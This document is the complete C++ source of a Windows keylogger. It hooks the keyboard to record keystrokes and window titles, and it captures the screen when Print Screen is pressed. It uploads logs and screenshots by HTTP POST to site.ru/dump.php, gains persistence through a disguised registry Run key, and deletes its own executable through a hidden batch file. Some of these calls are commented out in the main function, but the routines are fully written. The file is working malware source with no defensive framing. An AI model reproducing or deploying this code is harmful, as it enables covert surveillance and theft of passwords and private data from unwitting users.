#include <windows.h>
#include <fstream>
#include <iostream>
#include <algorithm>
#include <string>
#include <time.h>
#include <sstream>
#include <locale>
#include <wininet.h>
#include <wincrypt.h>
#include <Shlobj.h>

#pragma comment(lib,"wininet.lib")

char* title;
char* title_last;
MSG message;
HHOOK keyboardHook;
HHOOK hclipboard;
PKBDLLHOOKSTRUCT p;
HANDLE hFile=NULL;

LPSTR szAuthCode = "dev";
LPSTR szFileName = "error.log";
LPSTR szRegKeyName = "Key Log Checker";
LPSTR szFilePicName = "shot.pmb";

bool szFlagSend = false;
bool szFlagAutoload = false;

void DelSelf(void){
     char modulename[MAX_PATH];
     char batfile[MAX_PATH];
     char run[MAX_PATH];
     char batlines[MAX_PATH*4];
     LPSTR tempdir;
     char Buf[MAX_PATH];

     GetModuleFileName(NULL,modulename,MAX_PATH);

     tempdir = ((GetEnvironmentVariable(TEXT("TEMP"), Buf, MAX_PATH) > 0) ? Buf : NULL);

     LPSTR szBatName = "delself.bat";
     LPSTR szCmdCommand  = "cmd.exe /C ";

     int size_bat_file = 0;
     int size_bat_lines = 0;
     size_bat_file = sizeof(batfile);
     size_bat_lines = sizeof(batlines);

     strcpy_s(batfile,size_bat_file,tempdir);
     strcat_s(batfile,size_bat_file,"\\");
     strcat_s(batfile,size_bat_file,szBatName);

     strcpy_s(batlines,size_bat_lines,"@echo off\r\n:try\r\ndel \"");
     strcat_s(batlines,size_bat_lines,modulename);
     strcat_s(batlines,size_bat_lines,"\"\r\nif exist ");
     strcat_s(batlines,size_bat_lines,modulename);
     strcat_s(batlines,size_bat_lines," goto try\r\n");
     strcat_s(batlines,size_bat_lines,"del ");
     strcat_s(batlines,size_bat_lines,batfile);



     DWORD NOfBytes;
     HANDLE hbf= CreateFile(batfile, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     WriteFile(hbf,batlines,strlen(batlines),&NOfBytes, NULL);
     CloseHandle(hbf);

     strcpy_s(run,sizeof(run),szCmdCommand);
     strcat_s(run,sizeof(run),batfile);
     MessageBox(0,run,0,0);

     STARTUPINFO         si;
     PROCESS_INFORMATION pi;
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
     si.wShowWindow = SW_HIDE;
     si.dwFlags = STARTF_USESHOWWINDOW;

     CreateProcess(NULL,run,NULL,NULL,FALSE,DETACHED_PROCESS,NULL,NULL,&si,&pi);
}

int send_log(int type_send){
    if(szFlagSend){
        LPSTR hdrs ="Content-type: multipart/form-data, boundary=Jfbvjwj3489078yuyetu";
        static LPSTR accept[2]={"*/*", NULL};
        LPSTR szFile = NULL;
        if(type_send==0)
            szFile = szFileName;
        if(type_send==1)
            szFile = szFilePicName;
        HANDLE hlFile;
        DWORD dwFileSize, dwRead;
        LPBYTE pBuf = NULL;
        LPBYTE pDataStart = NULL;
        DWORD dwDataToSend = 0;
        long x;

        LPSTR szCodePrefixStart = "--Jfbvjwj3489078yuyetu\r\ncontent-disposition: form-data; name=\"code\"\r\n\r\n";
        LPSTR szCodePrefixEnd = "\r\n";
        LPSTR szFnamePrefix = "--Jfbvjwj3489078yuyetu\r\ncontent-disposition: form-data; name=\"fname\"\r\n\r\n";
        LPSTR szDataPrefix = "\r\n--Jfbvjwj3489078yuyetu\r\ncontent-disposition: form-data; name=\"data\"; filename=\"mylog.txt\"\r\nContent-Type: application/octet-stream\r\n\r\n";
        LPSTR szDataPostfix = "\r\n--Jfbvjwj3489078yuyetu--";

        hlFile = CreateFile(szFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
        if(!hlFile){return 0;}

        dwFileSize = GetFileSize(hlFile, NULL);
        pBuf = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, dwFileSize + 2048);

        pDataStart = pBuf;

        x = lstrlen(szCodePrefixStart);
        lstrcpyn((LPSTR)pDataStart, szCodePrefixStart, x + 1);
        pDataStart += x;
        x = lstrlen(szAuthCode);
        lstrcpyn((LPSTR)pDataStart, szAuthCode, x + 1);
        pDataStart += x;
        x = lstrlen(szCodePrefixEnd);
        lstrcpyn((LPSTR)pDataStart, szCodePrefixEnd, x + 1);
        pDataStart += x;


        x = lstrlen(szFnamePrefix);
        lstrcpyn((LPSTR)pDataStart, szFnamePrefix, x + 1);
        pDataStart += x;

        x = lstrlen(szFileName);
        lstrcpyn((LPSTR)pDataStart, szFileName, x + 1);
        pDataStart += x;

        x = lstrlen(szDataPrefix);
        lstrcpyn((LPSTR)pDataStart, szDataPrefix, x + 1);
        pDataStart += x;

        ReadFile(hlFile, pDataStart, dwFileSize, &dwRead, NULL);
        pDataStart += dwRead;

        x = lstrlen(szDataPostfix);
        lstrcpyn((LPSTR)pDataStart, szDataPostfix, x + 1);
        pDataStart += x;

        dwDataToSend = pDataStart - pBuf;

        HINTERNET hOpenHandle = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if(hOpenHandle){
            HINTERNET hConnectHandle = InternetConnect(hOpenHandle, TEXT("site.ru"),INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
            if(hConnectHandle){
                HANDLE hResourceHandle = HttpOpenRequest(hConnectHandle, TEXT("POST"),TEXT("/dump.php"), NULL, NULL, (LPCSTR*)accept, 0, 1);
                if(hResourceHandle){
                        HttpSendRequest(hResourceHandle, hdrs,strlen(hdrs), pBuf, dwDataToSend);
                        DWORD dwError = GetLastError();
                }
                InternetCloseHandle(hResourceHandle);
            }
            InternetCloseHandle(hConnectHandle);
        }
        InternetCloseHandle(hOpenHandle);

        HeapFree(GetProcessHeap(), 0, pBuf);
        CloseHandle(hlFile);
	}
	return 0;
}

void autorun(){
    if(szFlagAutoload){
        HKEY mykey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0, KEY_ALL_ACCESS|KEY_WOW64_64KEY,&mykey)==ERROR_SUCCESS)
        {
            char szPath[256];
            char filename[] = "\\key_log.exe";
            char szNewPath[256];
            char exe_path[256];
            if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, szPath)))
            {
                strcpy_s(szNewPath,sizeof(szNewPath),szPath);
                strcat_s(szNewPath,sizeof(szNewPath),filename);

                GetModuleFileNameA(NULL,exe_path,sizeof(exe_path));
                bool szBoolCF=0;
                if(CopyFile(exe_path,szNewPath,szBoolCF))
                {
                    RegSetValueExA(mykey,szRegKeyName,0,REG_SZ,(BYTE*)szNewPath,strlen(szNewPath));
                    DelSelf();
                    ExitProcess(0);
                }
            }
            RegCloseKey(mykey);
        }
    }
}

inline int GetFilePointer(HANDLE FileHandle){
    return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
}
bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height){
    bool Success=0;
    HDC SurfDC=NULL;
    HBITMAP OffscrBmp=NULL;
    HDC OffscrDC=NULL;
    LPBITMAPINFO lpbi=NULL;
    LPVOID lpvBits=NULL;
    HANDLE BmpFile=INVALID_HANDLE_VALUE;
    BITMAPFILEHEADER bmfh;
    if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
        return 0;
    if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
        return 0;
    HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
    BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
    if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL)
        return 0;
    ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
    lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    SelectObject(OffscrDC, OldBmp);
    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
        return 0;
    if ((lpvBits = new char[lpbi->bmiHeader.biSizeImage]) == NULL)
        return 0;
    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
        return 0;
    if ((BmpFile = CreateFile(filename, GENERIC_WRITE,0, NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
        return 0;
    DWORD Written;
    bmfh.bfType = 19778;
    bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return 0;
    if (Written < sizeof(bmfh))
        return 0;
    if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL))
        return 0;
    if (Written < sizeof(BITMAPINFOHEADER))
        return 0;
    int PalEntries;
    if (lpbi->bmiHeader.biCompression == BI_BITFIELDS)
        PalEntries = 3;
    else PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
                      (int)(1 << lpbi->bmiHeader.biBitCount) : 0;
    if(lpbi->bmiHeader.biClrUsed)
    PalEntries = lpbi->bmiHeader.biClrUsed;
    if(PalEntries){
    if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL))
        return 0;
        if (Written < PalEntries * sizeof(RGBQUAD))
            return 0;
    }
    bmfh.bfOffBits = GetFilePointer(BmpFile);
    if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL))
        return 0;
    if (Written < lpbi->bmiHeader.biSizeImage)
        return 0;
    bmfh.bfSize = GetFilePointer(BmpFile);
    SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return 0;
    if (Written < sizeof(bmfh))
        return 0;
    CloseHandle(BmpFile);
    return 1;
}
bool ScreenCapture(int x, int y, int width, int height, char *filename){
    HDC hDc = CreateCompatibleDC(0);
    HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
    SelectObject(hDc, hBmp);
    BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
    bool ret = SaveBMPFile(filename, hBmp, hDc, width, height);
    DeleteObject(hBmp);
    return ret;
}

void WriteTime(void){
    DWORD NOfBytes;
    OVERLAPPED ovlp;
    DWORD ffsze;
    SYSTEMTIME time;
    char buffer[30];

    GetLocalTime(&time);
    sprintf_s(buffer,sizeof(buffer),"\r\n%02d.%02d.%d %02d:%02d",time.wDay,time.wMonth,time.wYear,time.wHour,time.wMinute);

    ffsze=GetFileSize(hFile,NULL);
    ovlp.OffsetHigh=0;
    ovlp.hEvent=NULL;
    ovlp.Offset=ffsze;

    WriteFile(hFile,buffer,strlen(buffer),&NOfBytes,&ovlp);
}

void WriteTitle(HWND hWnd){
    WriteTime();
    DWORD NOfBytes;
    OVERLAPPED ovlp;
    DWORD ffsze;
    char buffer[250];
    char title[256];
    GetWindowText(hWnd,title,100);
    sprintf_s(buffer,sizeof(buffer)," %s\r\n",title);
    ffsze=GetFileSize(hFile,NULL);
    ovlp.OffsetHigh=0;
    ovlp.hEvent=NULL;
    ovlp.Offset=ffsze;

    WriteFile(hFile,buffer,strlen(buffer),&NOfBytes,&ovlp);
}

short GetSymbolFromVK(UINT VkCode){
    BYTE btKeyState[256];
    HKL hklLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)); // узнаем язык клавиатуры
    WORD Symbol;
    GetKeyboardState(btKeyState);
    if((ToAsciiEx(VkCode, MapVirtualKey(VkCode, 0), btKeyState, &Symbol, 0, hklLayout) == 1) && // сам перевод
                 GetKeyState(VK_CONTROL) >= 0 && GetKeyState(VK_MENU) >= 0) // проверяем CTRL и ALT
        return Symbol;
     return -1;
}

void WriteSymbol(UINT VkCode){
    DWORD NOfBytes = NULL;
    OVERLAPPED ovlp;
    DWORD ffsze;
    short wc;

    ffsze=GetFileSize(hFile,NULL);
    ovlp.OffsetHigh=0;
    ovlp.hEvent=NULL;
    ovlp.Offset=ffsze;
    setlocale(LC_ALL,"");

    LPSTR szKeyReturn = "[return]\r\n";
    LPSTR szKeyBack = "[backspace]";
    LPSTR szKeyShift = "[shift]";
    LPSTR szKeySpace = "[space]";
    LPSTR szKeyDelete = "[delete]";
    LPSTR szKeyLeft = "[left]";
    LPSTR szKeyRight = "[right]";
    LPSTR szKeyUp = "[up]";
    LPSTR szKeyDown = "[down]";
    LPSTR szKeyEscape = "[escape]";
    LPSTR szKeyScreen = "[screen]";

    if(VkCode==VK_RETURN)
        WriteFile(hFile,szKeyReturn,strlen(szKeyReturn),&NOfBytes,&ovlp);
    if(VkCode==VK_BACK)
        WriteFile(hFile,szKeyBack,strlen(szKeyBack),&NOfBytes,&ovlp);
    if(VkCode==VK_SHIFT)
        WriteFile(hFile,szKeyShift,strlen(szKeyShift),&NOfBytes,&ovlp);
    if(VkCode==VK_SPACE)
        WriteFile(hFile,szKeySpace,strlen(szKeySpace),&NOfBytes,&ovlp);
    if(VkCode==VK_DELETE)
        WriteFile(hFile,szKeyDelete,strlen(szKeyDelete),&NOfBytes,&ovlp);
    if(VkCode==VK_LEFT)
        WriteFile(hFile,szKeyLeft,strlen(szKeyLeft),&NOfBytes,&ovlp);
    if(VkCode==VK_RIGHT)
        WriteFile(hFile,szKeyRight,strlen(szKeyRight),&NOfBytes,&ovlp);
    if(VkCode==VK_UP)
        WriteFile(hFile,szKeyUp,strlen(szKeyUp),&NOfBytes,&ovlp);
    if(VkCode==VK_DOWN)
        WriteFile(hFile,szKeyDown,strlen(szKeyDown),&NOfBytes,&ovlp);
    if(VkCode==VK_ESCAPE)
        WriteFile(hFile,szKeyEscape,strlen(szKeyEscape),&NOfBytes,&ovlp);
    if(VkCode==VK_SNAPSHOT){
        WriteFile(hFile,szKeyScreen,strlen(szKeyScreen),&NOfBytes,&ovlp);
        ScreenCapture(0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), szFilePicName);
        send_log(1);
    }
    if((wc=GetSymbolFromVK(VkCode))!=-1)
        //if(iswprint(wc))
            WriteFile(hFile,&wc,1,&NOfBytes,&ovlp);
}

//LRESULT CALLBACK callwndproc (int nCode,WPARAM wParam, LPARAM lParam){
//
//    char* buffer;
//    if(OpenClipboard(NULL)){
//        HANDLE hData = GetClipboardData(CF_TEXT);
//        char* chBuffer= (char*)GlobalLock(hData);
//        buffer = chBuffer;
//        GlobalUnlock(hData);
//        CloseClipboard();
//    }
//    MessageBox(0,buffer,0,0);
//    return CallNextHookEx(NULL, nCode, wParam, lParam);
//}

LRESULT CALLBACK hookProc(int nCode,WPARAM wParam, LPARAM lParam){
	HWND hwnd_wind = GetForegroundWindow();
	int length = GetWindowTextLength(hwnd_wind);
	if (!title)
		title = (char *)malloc(length*sizeof(char)+10);
	else
    {
		free(title);
		title = (char *)malloc(length*sizeof(char)+10);
	}

	GetWindowTextA(hwnd_wind,title,length + 1);

	if (strcmp(title, title_last) != 0)
    {
	    WriteTitle(hwnd_wind);
        free(title_last);
        title_last = (char *)malloc(length*sizeof(char)+10);
        strcpy_s(title_last,510, title);
	}

	if (wParam == WM_KEYDOWN)
	{
		p = (PKBDLLHOOKSTRUCT)(lParam);
		WriteSymbol(p->vkCode);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void msgLoop(){
	while (GetMessage(&message, NULL, 0, 0))
	{

        TranslateMessage(&message);
        DispatchMessage(&message);

	}
}

void CALLBACK t_send(HWND hwnd, UINT uMsg, UINT timerId, DWORD dwTime){
    CloseHandle(hFile);
    send_log(0);
    DeleteFile(szFileName);
    hFile=CreateFile(szFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
}

int WINAPI WinMain(HINSTANCE hInstance,	HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    //autorun();
    //send_log(0);

    if((hFile=CreateFile(szFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL))==INVALID_HANDLE_VALUE)
        return FALSE;

	if (!title_last)
		title_last = (char *)malloc(255*sizeof(char));

	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,hookProc, hInstance, 0);

	//SetTimer(NULL, 0, 1000*60*60*4,(TIMERPROC) &t_send); //every 4 hours

	msgLoop();
	UnhookWindowsHookEx(keyboardHook);

	return 0;
}
